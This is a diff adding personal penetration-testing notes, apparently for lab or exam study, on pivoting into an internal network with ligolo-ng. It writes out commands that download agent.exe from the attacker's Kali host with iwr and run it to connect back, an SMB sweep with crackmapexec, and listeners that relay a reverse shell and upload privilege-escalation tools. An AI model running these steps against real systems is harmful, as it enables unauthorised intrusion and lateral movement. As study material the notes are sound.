@@ -6,3 +6,38 @@ Setup ligolo in kali and transfer the agent.exe to target:
 
 Setup the Python web server for hostinbg the file transfer to target:
 >python server trigger
+
+In target:
+iwr -uri http://$Kali IP/agent.exe -Outfile agent.exe
+
+Confirm the existence of the files:
+>dir
+>./agent -connect $KaliIP:11601 -ignore-cert 
+>session - can see the session # for this (e.g. 1)
+
+Then, we need to add the target IP adr into our Routing table in ligolo bcozwe want to access the internal 172.16.116.0/24 network, so we need to open a new terminal and add the corresponding route to our ligolo-ng interface with the following command :
+>sudo ip route add 172.16.116.0/24 dev ligolo
+
+To confirm our ip routing is added,
+>ip route list
+
+All set, now start the logo, back to ligolo session in kali,
+>start
+
+use smb to test login attempt:
+>crackmapexec smb 172.16.116.0/24
+
+Reverse shell:
+Add listeners to the ligolo session and connect back to our local host listening on port 4444 (for example)
+>listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+(0.0.0.0 means for all interfaces)
+
+To confirm, 
+>listener_list
+
+Transferring files:
+Once we’ve got the reverse shell, we need to upload our winps, lin ps, privest check or seatbelt, etc.
+add another listener at another port, bcoz the previous one is for setting up the tunnel.
+>listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000 #1234 was used in the last port for reverse shell connection
+
+
